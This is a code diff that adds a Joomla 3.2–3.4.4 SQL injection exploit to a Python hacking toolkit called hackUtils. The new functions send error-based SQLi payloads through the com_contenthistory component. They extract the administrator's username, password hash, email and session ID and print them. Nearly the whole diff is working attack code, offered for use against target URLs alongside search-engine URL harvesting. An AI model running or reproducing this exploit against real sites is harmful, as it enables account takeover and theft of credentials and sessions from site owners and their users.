@@ -18,6 +18,11 @@ import getopt
 import hashlib
 import base64
 import ConfigParser
+import cookielib
+import requests
+import socket
+timeout = 10
+socket.setdefaulttimeout(timeout)
 
 from bs4 import BeautifulSoup
 
@@ -321,6 +326,44 @@ def encryptStr(value):
     print "[*] SHA256: "+sha256
     print "[*] Base64: "+b64
     
+def checkJoomlaSQLi(url):
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking Joomla 3.2.0 - 3.4.4 history.php SQLi..."
+    poc = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select 0x6176666973686572),floor(rand(0)*2))x from information_schema.tables group by x)a)"
+    urlA=url+poc
+    try:
+        result = requests.get(urlA,timeout=30,allow_redirects=True,verify=False).content
+        if 'avfisher' in result:
+            username = getInfoByJoomlaSQLi(url, 'username')
+            password = getInfoByJoomlaSQLi(url, 'password')
+            email = getInfoByJoomlaSQLi(url, 'email')
+            session_id = getInfoByJoomlaSQLi(url, 'session_id')
+            print '[+] URL: '+url+', admin: '+username+', password: '+password+', email: '+email+', session_id: '+session_id 
+        else:
+            print '[!] URL: '+url+', no vuls!'
+    except Exception,e:
+        print '[!] URL: '+url+', connection failed!'
+
+def getInfoByJoomlaSQLi(url, param):
+    if 'username' in param:
+        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(username)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
+    elif 'password' in param:
+        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(password)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
+    elif 'email' in param:
+        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(email)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
+    elif 'session_id' in param:
+        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) from %23__session limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
+    urlA=url+payload
+    try:
+	result = requests.get(urlA,timeout=30,allow_redirects=True,verify=False).content
+        reg = ".*Duplicate entry \'(.*?)1\'.*"
+        match_url = re.search(reg,result)
+	if match_url:
+	   info=match_url.group(1)
+        return info
+    except Exception,e:
+        return 'no info!'    
+    
 def myhelp():
     print "\n+-----------------------------+"
     print "|  hackUtils v0.0.1           |"
@@ -333,19 +376,21 @@ def myhelp():
     print "  -b keyword, --baidu=keyword                         Fetch URLs from Baidu based on specific keyword"
     print "  -g keyword, --google=keyword                        Fetch URLs from Google based on specific keyword"
     print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
+    print "  -j url, --joomla=url                                Exploit SQLi for Joomla 3.2 - 3.4"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
     print "  hackUtils.py -b inurl:www.example.com"
     print "  hackUtils.py -g inurl:www.example.com"
     print "  hackUtils.py -w .php?id="
+    print "  hackUtils.py -j http://www.joomla.com/"
     print "  hackUtils.py -d example.com"
     print "  hackUtils.py -e text"
     print "\n[!] to see help message of options run with '-h'"
 
 def main():
     try:
-        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:d:e:",["help","baidu=","google=","wooyun=","domain=","encrypt="])
+        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:j:d:e:",["help","baidu=","google=","wooyun=","joomla=","domain=","encrypt="])
     except getopt.GetoptError:
         print "\n[WARNING] error, to see help message of options run with '-h'"
         sys.exit()
@@ -359,6 +404,8 @@ def main():
             fetchUrls('google',value,50)
         if name in ("-w","--wooyun"):
             fetchUrls('wooyun',value,50)
+        if name in ("-j","--joomla"):
+            checkJoomlaSQLi(value)
         if name in ("-d","--domain"):
             scanSubDomains('baidu',value,50)
         if name in ("-e","--encrypt"):
